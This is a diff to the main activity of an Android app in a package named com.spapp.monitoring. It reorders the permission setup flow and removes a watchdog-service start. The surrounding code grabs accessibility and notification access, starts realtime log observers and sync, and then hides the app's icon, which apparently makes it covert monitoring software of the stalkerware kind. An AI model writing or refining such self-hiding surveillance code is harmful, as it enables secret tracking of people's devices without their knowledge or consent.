@@ -128,7 +128,6 @@ class MainActivity : AppCompatActivity() {
         deviceState.markSetupCompleted()
         refreshPermissionStatus()
         triggerAutoSyncAfterAccessibility()
-        com.spapp.monitoring.sync.PersistentWatchdogService.start(applicationContext)
         Log.i(TAG, "All core permissions active — hiding app icon and closing app")
 
         hideAppIcon()
@@ -154,10 +153,10 @@ class MainActivity : AppCompatActivity() {
         RealtimeLogObserverManager.start(applicationContext)
         SyncScheduler.runOnce(applicationContext)
 
-        if (getMissingRuntimePermissions().isEmpty() && isAccessibilityEnabled() && isNotificationAccessGranted()) {
-            completeSetupAndClose()
-        } else if (isOneTapFlowRunning) {
+        if (isOneTapFlowRunning || !deviceState.isFirstSetupCompleted) {
             handleNextSetupStep()
+        } else if (getMissingRuntimePermissions().isEmpty() && isAccessibilityEnabled() && isNotificationAccessGranted()) {
+            completeSetupAndClose()
         }
 
         val grantedCount = results.values.count { it }
@@ -1033,7 +1032,11 @@ class MainActivity : AppCompatActivity() {
 
 
         if (isCore && isAccessibility && isNotification) {
-            completeSetupAndClose()
+            if (!deviceState.isFirstSetupCompleted || isOneTapFlowRunning) {
+                handleNextSetupStep()
+            } else {
+                completeSetupAndClose()
+            }
             return
         } else if (isCore && isAccessibility && !isNotification) {
 
